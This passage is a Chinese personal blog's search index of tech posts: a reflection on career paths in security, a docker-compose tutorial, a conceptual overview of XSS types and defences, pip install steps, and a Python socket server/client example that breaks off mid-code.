<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>网络安全行业个人发展浅析</title>
    <link href="/2021/01/24/2021%E5%B9%B41%E6%9C%8824%E6%97%A5-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%B8%AA%E4%BA%BA%E5%8F%91%E5%B1%95%E6%B5%85%E6%9E%90/"/>
    <url>/2021/01/24/2021%E5%B9%B41%E6%9C%8824%E6%97%A5-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%B8%AA%E4%BA%BA%E5%8F%91%E5%B1%95%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>2020年9月的时候，凭借着个人兴趣的驱使。我放弃了自己开发的经历，开始慢慢的转向安全方向。当时没有什么眉目，就只盯着CTF方向开始钻研，开始慢慢懂得了一些漏洞的利用方式。最近在思考自己的安全之路时，我的眼光是迷茫，我不知道自己该学习什么，应该往哪个方向去学习，所以尝试了自己回答以下的问题来帮助自己看清自己的路线。</p><p><strong>0x01 网络安全有哪些工作类型？我想去哪个方向？</strong></p><ul><li>安全研发：工作主要是开发用于安全防御的产品，开发的产品主要用于将已知且常见的漏洞进行防御。</li><li>二进制方向：工作主要偏向于软件破解、病毒分析等工作。</li><li>网络渗透方向：工作主要偏向于网络渗透攻击、攻击网站、攻击个人电脑等。需求广并且方向多，通常也需要比较广的知识面。<br>参考教程：</li></ul><ol><li>小白怎么入门网络安全？看这篇就够啦！：<a href="https://www.cnblogs.com/xuanyuan/p/13624707.html">https://www.cnblogs.com/xuanyuan/p/13624707.html</a></li></ol><p><strong>0x02 红队是什么？</strong></p><p>模拟真实世界的黑客攻击的团队。真实世界的黑客攻击是通过综合利用各种手段来进行黑客攻击的一种方式，其中包括社工等方式（这种方式又叫做APT）。真实世界的黑客极具目的性，但是并不希望被检测到。</p><p><strong>0x03 红队和渗透测试是什么关系？</strong></p><p>渗透测试和红队在技术方向非常类似渗透测试，但是在思维方式上却完全不同。</p><ol><li>渗透测试的重点在于尽可能多的检测出漏洞所在。</li><li>红队的关键点在于尽可能达到目的并且隐藏自己的信息。</li></ol><p>参考教程：</p><ol><li>谈谈渗透测试和红队的区别：<a href="https://www.secrss.com/articles/12168">https://www.secrss.com/articles/12168</a></li></ol><p><strong>0x04 CTF和其他安全方向的关系是什么？</strong></p><p>CTF分为两种模式「解题模式」和「AWD模式」，解题模式通常是为了综合利用各种「Web漏洞」和「安全知识」来获取flag从而赢得分数。大部分时候是运气、实力、细心程度的一种考察，可以用来训练自己，让自己在Web漏洞的掌握上更上一层楼。但是这样的知识只能在红队中进行打点，所获得的知识体系太过于局限了。</p><p><strong>0x05 我现在处于安全届的哪个层次？</strong></p><p>上次gcow团队中童童师傅的评价</p><ul><li>bypass技巧 10%</li><li>网络基础 0%</li><li>常见web漏洞 30%</li><li>代码审计 5%</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/05B07287-4F7B-44EB-82A4-CF44BA78172D.png"></p><p>我是菜鸡，干巴爹👋</p><p><strong>0x06 有哪些比较全面的学习技能点？</strong></p><p>网络安全涉及的内容非常广，其主要的学习路线如下图所示。可以简单归纳为：</p><ul><li>基础知识：Web发展简史、计算机网络、域名系统、HTTP标准、代码审计、WAF</li><li>信息收集：域名信息、 站点信息、端口信息、其它</li><li>内网渗透：Windows信息收集、持久化、Linux信息收集、痕迹清理、其他</li><li>常见漏洞：SQL注入、XSS、CSRF、SSRF、命令注入、文件读取、文件上传、文件包含、XXE、模版注入、Xpath注入、 逻辑漏洞 、业务漏洞、配置安全、中间件、Web Cache欺骗攻击</li><li>语言与框架：PHP、Python、Java、JavaScript、Ruby、C\C++、C#</li><li>防御技术：总体思路、 团队建设、威胁情报、风险控制、加固检查、蜜罐技术、入侵检测、应急响应、溯源分析</li><li>工具与资源：工具列表、推荐资源、爆破工具、下载工具、流量相关、嗅探工具、SQLMap使用</li><li>其他：认证方式、拒绝服务攻击、DNS劫持、Docker</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/340EC80F-6F47-491F-9924-894F778CF411.png"></p><p><strong>0x07 我在哪些方面还有缺陷？</strong></p><p>太多了（</p><p><strong>0x09 如何学习这些知识？</strong></p><p>参考敏捷开发，不断迭代：有一个粗略的认识-&gt;有了进一步的认识-&gt;彻底掌握-&gt;温故而知新。不用纠缠于把一门课程全部学完学懂才进入下一门课程。</p><p>参考教程：</p><ol><li>网络安全自学篇（二十三）| Web安全学习路线及木马、病毒和防御初探：<a href="https://cloud.tencent.com/developer/article/1620918">https://cloud.tencent.com/developer/article/1620918</a></li></ol><p><strong>0x10 接下来我应该怎么做？</strong></p><ul><li>分析各种招聘的要求，确定学习目标</li><li>制定学习计划</li><li>寻找学习资源进行学习</li><li>及时总结和回顾</li></ul>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>思考</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker-compose介绍以及简单使用</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-docker-compose%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-docker-compose%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><h2 id="1-1-docker"><a href="#1-1-docker" class="headerlink" title="1.1 docker"></a>1.1 docker</h2><p>按照下面的步骤进行安装：</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 更新现有的包</span><br>sudo apt update<br><br><span class="hljs-meta"># 添加Docker PGP公钥</span><br>curl -fsSL https:<span class="hljs-comment">//download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br><br><span class="hljs-meta"># 配置Docker APT库</span><br>echo <span class="hljs-string">&#x27;deb [arch=amd64] https://download.docker.com/linux/debian buster stable&#x27;</span> | sudo tee /etc/apt/sources.list.d/docker.list<br><br><span class="hljs-meta"># 更新一下APT列表</span><br>sudo apt-<span class="hljs-keyword">get</span> update<br><br><span class="hljs-meta"># 安装Docker，在安装前先删除原来系统中可能自带的Docker：</span><br>sudo apt-<span class="hljs-keyword">get</span> remove docker docker-engine docker.io<br><br><span class="hljs-meta"># 安装Docker:</span><br>sudo apt-<span class="hljs-keyword">get</span> install docker-ce<br><br><span class="hljs-meta"># 看看安装成功了没:</span><br>sudo docker run hello-world<br><br><span class="hljs-meta"># 设置启动</span><br>sudo systemctl start docker<br>sudo systemctl enable docker<br></code></pre></td></tr></table></figure><h2 id="1-2-docker-compose"><a href="#1-2-docker-compose" class="headerlink" title="1.2 docker-compose"></a>1.2 docker-compose</h2><p>获取执行文件到本地（可能需要sudo）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<br></code></pre></td></tr></table></figure><p>为可执行文件设置权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chmod +x /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<br></code></pre></td></tr></table></figure><p>确定是否安装成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker-compose version<br></code></pre></td></tr></table></figure><p>最后的效果:<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/15906035-DA64-401D-9C4C-BEE8738BDB68.png"></p><h1 id="2-docker-compose介绍"><a href="#2-docker-compose介绍" class="headerlink" title="2 docker-compose介绍"></a>2 docker-compose介绍</h1><p>首先需要知道 docker-compose 是为了解决什么场景而出现的。</p><p>运行 docker 需要使用长而繁杂的命令。如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run \<br>  --detach \<br>  --name registry \<br>  --hostname registry \<br>  --volume $(<span class="hljs-built_in">pwd</span>)/app/registry:/var/lib/registry \<br>  --publish 5000:5000 \<br>  --restart unless-stopped \<br>  registry:latest<br></code></pre></td></tr></table></figure><p>为了方便运行，可以将这种docker run写成shell文件。</p><p>web 镜像确比这更为复杂，一个简单的 docker run 命令不足以开启一个 Web 服务，通常需要多个镜像，镜像之间还会有一些优先关系。这种关系的编排就叫做 docker 的编排。</p><p>docker 提供一个命令行工具 docker-compose 来帮助完成 docker 的编排，要使用 docker-compose 需要编写一个 docker-compose.yml 文件（配置文件）。<br>例如：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">beginor/geoserver:2.11.1</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">geoserver-web</span><br>    <span class="hljs-attr">hostname:</span> <span class="hljs-string">geoserver-web</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">8080</span><span class="hljs-string">:8080</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./web/data_dir:/geoserver/data_dir</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./web/logs:/geoserver/logs</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br>    <span class="hljs-attr">links:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">database:database</span><br>  <span class="hljs-attr">database:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">beginor/postgis:9.3</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">postgis</span><br>    <span class="hljs-attr">hostname:</span> <span class="hljs-string">postgis</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">5432</span><span class="hljs-string">:5432</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./database/data:/var/lib/postgresql/data</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-attr">POSTGRES_PASSWORD:</span> <span class="hljs-string">1q2w3e4R</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br></code></pre></td></tr></table></figure><p>上面的yml文件定义了两个服务web和database，一个服务在运行时对应一个容器的实例，上面的文件表示要启动两个实例。</p><p>在部署时，通常需要将 docker-compose.yml 文件放到一个目录下，表示一个应用，docker 会为这个应用创建独立的网络。</p><p>可以使用 <code>docker-compose up -d</code> 来启动这个程序。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">~/Desktop/<span class="hljs-built_in">source</span> » docker-compose up -d                                                                                                                       255 ↵ littlechieh6@MacBook-Pro<br>Creating network <span class="hljs-string">&quot;source_app1&quot;</span> with the default driver<br>Building server<br>Step 1/6 : FROM ubuntu:16.04<br>16.04: Pulling from library/ubuntu<br>be8ec4e48d7f: Pull complete<br>33b8b485aff0: Pull complete<br>d887158cc58c: Pull complete<br>05895bb28c18: Pull complete<br>Digest: sha256:3355b6e4ba1b12071ba5fe9742042a2f10b257c908fbdfac81912a16eb463879<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> ubuntu:16.04<br>……<br></code></pre></td></tr></table></figure><p>要停止上面的容器，只需要输入 <code>docker-compose down</code> 即可。</p><p>从上面的命令可以看出，docker-compose 不仅可以根据配置文件 docker-compose.yml 自动创建网络，启动响应的容器实例，也可以根据配置删除容器实例。</p><h1 id="3-docker-compose使用"><a href="#3-docker-compose使用" class="headerlink" title="3 docker-compose使用"></a>3 docker-compose使用</h1><p>常用的命令：<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh"> <span class="hljs-comment"># 启动 docker-compose 的实例</span><br>docker-compose up -d<br><br><span class="hljs-comment"># 关闭 docker-compose 的实例</span><br>docker-compose down<br><br><span class="hljs-comment"># 列出本机正在运行的容器</span><br>docker container ls<br>docker ps<br><br><span class="hljs-comment"># 用来查看 docker 容器的输出，即容器里面 Shell 的标准输出。</span><br>$ docker container logs [containerID]<br><br><span class="hljs-comment"># 进入容器</span><br>$ docker container <span class="hljs-built_in">exec</span> -it [containerID] /bin/bash<br><br></code></pre></td></tr></table></figure></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p> 参考教程：</p><ol><li>使用 docker-compose 替代 docker run：<a href="https://beginor.github.io/2017/06/08/use-compose-instead-of-run.html">https://beginor.github.io/2017/06/08/use-compose-instead-of-run.html</a></li><li>Kali Linux 2020.1 Release安装Docker-CE：<a href="https://zhuanlan.zhihu.com/p/110675842">https://zhuanlan.zhihu.com/p/110675842</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS基础基本概念以及比较 from 《Web安全攻防》</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-XSS%E5%9F%BA%E7%A1%80%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E6%AF%94%E8%BE%83-from-%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E3%80%8B/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-XSS%E5%9F%BA%E7%A1%80%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E6%AF%94%E8%BE%83-from-%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-简介与对比"><a href="#1-简介与对比" class="headerlink" title="1 简介与对比"></a>1 简介与对比</h1><p>XSS攻击可以分为三种</p><ol><li>反射型：一次性、通过邮件传播、需要经过服务器</li><li>Dom 型（文档对象模型，Document Object Model）：一次性、不需经过服务器（不发送消息）</li><li>存储型：持久性、通常出现在留言板中、通常是处于信任的链接中（熟悉的论坛网站）</li></ol><p>反射型和存储型都需要向外部发送信息，经过服务器后传回，而 DOM 型由本地的浏览器进行解析执行。</p><p>区别反射型和 DOM 型最简单的检验方法就是「Burp 抓包」，如果 Burp 抓到数据就是反射型，抓不到数据就是DOM型。（面试时童童师傅教的</p><p>DOM 型和反射型通常都是攻击者构造 URL，存储型则是构造 Payload 测试网站的输入点。</p><ul><li>DOM型：数据=&gt;客户端</li><li>反射型：数据=&gt;服务器=&gt;客户端</li><li>存储型：数据=&gt;服务器=&gt;数据库=&gt;客户端</li></ul><h1 id="2-防御XSS"><a href="#2-防御XSS" class="headerlink" title="2 防御XSS"></a>2 防御XSS</h1><p>XSS 的修复分为输入和输出两部分。通过过滤将输入的恶意代码拦截到外面（类似乘飞机的安检）。在输出时也必须要留意，否则过去输入的恶意代码可能也会造成 XSS。</p><ol><li>过滤’、“、&lt;、&gt;、on*等非法字符。</li><li>输出的到页面的数据，需要进行HTML实体编码、Javascript编码。</li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Or Mac安装pip2 Or pip3</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Linux-Or-Mac%E5%AE%89%E8%A3%85pip2-Or-pip3/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Linux-Or-Mac%E5%AE%89%E8%A3%85pip2-Or-pip3/</url>
    
    <content type="html"><![CDATA[<p>🙃为什么 Kali 的 Python 不自带 pip？为什么？为什么？</p><h1 id="1-Python2"><a href="#1-Python2" class="headerlink" title="1 Python2"></a>1 Python2</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 下载代码</span><br>wget https://bootstrap.pypa.io/2.6/get-pip.py<br><span class="hljs-comment"># python 进行安装</span><br>python2 get-pip.py<br><span class="hljs-comment"># 验证是否安装成功</span><br>pip -V<br><br></code></pre></td></tr></table></figure><h1 id="2-Python3"><a href="#2-Python3" class="headerlink" title="2 Python3"></a>2 Python3</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 下载代码</span><br>wget https://bootstrap.pypa.io/get-pip.py<br><span class="hljs-comment"># python 进行安装</span><br>python3 get-pip.py<br><span class="hljs-comment"># 验证是否安装成功</span><br>pip -V<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python网络编程之socket简单使用</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B9%8Bsocket%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B9%8Bsocket%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h1><p>Python 提供两个级别的服务：</p><ol><li>Socket（低级别）</li><li>SocketServer（高级别）</li></ol><p>什么是 Socket？俗称「套接字」，对 TCP 协议的抽象，可以用于主机之间或者进程之间的通信。</p><p>首先用一个简单实例来了解 socket 创建、连接、通信的基本步骤。server 端的基本步骤：</p><ol><li>绑定 hostname、port</li><li>使用 accept 方法进行等待</li><li>将消息发送给 client 端</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># 引入模块</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># 创建socket对象，套接字家族选用AF_INET，套接字类型选用面向连接。</span><br>server_socket = socket.socket(<br>    family=socket.AF_INET,<br>    type=socket.SOCK_STREAM<br>)<br><br><br><span class="hljs-comment"># 获取本机主机名:MacBook-Pro.local</span><br>host = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># 绑定端口号</span><br>server_socket.bind((host, port))<br><br><br><span class="hljs-comment"># 设置最大连接数，超过后排队</span><br>server_socket.listen(<span class="hljs-number">5</span>)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 建立客户端连接</span><br>    client_socket, addr = server_socket.accept()<br>    print(<span class="hljs-string">f&#x27;连接地址：<span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br><br><br>    message = <span class="hljs-string">&#x27;Hello world, socket!&#x27;</span><br>    client_socket.send(<br>        message.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    )<br>    client_socket.close()<br><br></code></pre></td></tr></table></figure><p>client端的基本步骤：</p><ol><li>指定 hostname、port 连接到服务</li><li>接受消息</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># 创建socket对象</span><br>s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)<br><br><br><span class="hljs-comment"># 获取本机名，设置端口号</span><br>hostname = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># 连接到服务</span><br>s.connect(<br>    (hostname, port)<br>)<br><br><br><span class="hljs-comment"># 接受消息</span><br>message = s.recv(<span class="hljs-number">1024</span>)<br>print(message.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><h1 id="2-端口"><a href="#2-端口" class="headerlink" title="2 端口"></a>2 端口</h1><p>一个套接字只是用户程序和内核信息交互的枢纽，他自身没有太多信息，也没有网络协议和端口号。在进行网络通信时，必须把一个套接字和一个地址相关联，这个过程就是地址绑定的过程。</p><p>许多时候内核会自动绑定一个地址，然而很多时候为了方便记忆和管理，都会进行手动绑定。最典型的情况就是服务器进程绑定一个端口，等待其他的进程进行连接。</p><p>下面进行简单的验证，server端的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># 引入模块</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># 创建socket对象，套接字家族选用AF_INET，套接字类型选用面向连接。</span><br>server_socket = socket.socket(<br>    family=socket.AF_INET,<br>    type=socket.SOCK_STREAM<br>)<br><br><br><span class="hljs-comment"># 获取本机主机名:MacBook-Pro.local</span><br>host = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># 绑定端口号</span><br>server_socket.bind((host, port))<br><br><br><span class="hljs-comment"># 设置最大连接数，超过后排队</span><br>server_socket.listen(<span class="hljs-number">5</span>)<br><br><br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 建立客户端连接</span><br>    client_socket, addr = server_socket.accept()<br>    count += <span class="hljs-number">1</span><br>    print(<span class="hljs-string">f&#x27;连接地址：<span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br>    print(count)<br><br><br>    message = <span class="hljs-string">&#x27;Hello world, socket!&#x27;</span><br>    client_socket.send(<br>        message.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    )<br>    client_socket.close()<br><br></code></pre></td></tr></table></figure><p>每次连接之后都会输出对方的 IP 和端口，这样就能比较清晰的观察端口的变化。</p><p>client端（未绑定固定的端口）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># 创建socket对象</span><br>s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)<br><br><br><span class="hljs-comment"># 获取本机名，设置端口号</span><br>hostname = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># 连接到服务</span><br>s.connect(<br>    (hostname, port)<br>)<br><br><br><span class="hljs-comment"># 接受消息</span><br>message = s.recv(<span class="hljs-number">1024</span>)<br>print(message.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>首先启动server端，然后启动client端，就可以看到client端回显下面的字母：Hello world, socket!</p><p>多次运行之后就能清楚的发现client.py的端口在发生变化，说明其端口是由系统自动分配的。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/BB0A8DF5-6EBA-4ED7-88C8-6F69100864CC.png"></p><p>可以考虑手动绑定端口，让ip的端口固定为自己想要的端口，在 connect 之前执行如下代码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br>s.bind(<br>    (hostname, <span class="hljs-number">59446</span>)<br>)<br><br></code></pre></td></tr></table></figure><p>最后代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 